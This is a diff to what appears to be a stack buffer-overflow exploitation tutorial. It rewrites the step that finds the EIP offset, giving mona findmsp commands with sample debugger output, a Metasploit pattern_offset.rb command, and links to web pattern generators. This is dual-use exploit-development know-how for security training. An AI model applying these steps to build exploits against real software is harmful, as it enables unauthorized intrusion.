@@ -135,16 +135,44 @@ try:
 except:
     print("Could not connect.")
 ```
-++++++++++++++++++++++++++++++++++++++++++++
-Send that payload to the application, make sure it crashed and grab the EIP value in the debugger.We will now use a second script from Metasploit called pattern_offset.rb. What this script will do is take that value and seeing exactly where it exists in the buffer length we designate, showing us the point where the buffer will crash. 
+
+Send that payload to the application, make sure it crashed and grab the EIP value in the debugger.
+
+Now, we have 3 methods to find the offset:
+
+
+## Method 1
+
+Use mona's findmsp command, with the distance argument set to the pattern length.
+
+    ...
+    !mona findmsp -distance 666
+    
+    [+] Looking for cyclic pattern in memory
+    Cyclic pattern (normal) found at 0x005f3614 (length 600 bytes)
+    Cyclic pattern (normal) found at 0x005f4a40 (length 600 bytes)
+    Cyclic pattern (normal) found at 0x017df764 (length 600 bytes)
+    **EIP contains normal pattern : 0x78413778 (offset 112)**
+    ESP (0x017dfa30) points at offset 116 in normal pattern (length 484)
+    EAX (0x017df764) points at offset 0 in normal pattern (length 600)
+    EBP contains normal pattern : 0x41367841 (offset 108)
+    ...
+
+
+## Method 2
+
+We will now use a second script from Metasploit called pattern_offset.rb. What this script will do is take that value and seeing exactly where it exists in the buffer length we designate, showing us the point where the buffer will crash. 
 
 ```
-root@gh0x0st:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134 -l 600
-[*] Exact match at offset 524
+root@gh0x0st:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q pasteESPvaluehere -l 666
+[*] Exact match at offset 112
 ```
-Or you can also use these web generator to find the offset:
+## Method 3
+
+You can also use these web generator to find the offset:
 1. https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
 2. https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
 
 ### 3. Control ESP
 
